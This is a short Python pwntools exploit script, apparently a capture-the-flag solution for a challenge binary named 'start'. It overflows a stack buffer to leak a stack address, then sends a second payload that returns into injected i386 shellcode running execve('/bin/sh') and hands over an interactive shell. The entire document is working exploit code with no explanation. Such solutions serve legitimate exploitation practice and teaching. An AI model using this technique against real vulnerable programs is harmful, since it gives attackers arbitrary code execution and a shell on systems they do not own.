from pwn import *

file = './start'
elf = ELF(file)
io = process(file)

payload = b'A' * 20 + p32(0x08048087)

io.recvuntil(b':')
io.send(payload)

esp = u32(io.recv()[:4])

payload2 = b'A' * 20 + p32(esp+20) + asm(shellcraft.i386.execve('/bin/sh'))

io.sendline(payload2)
io.interactive()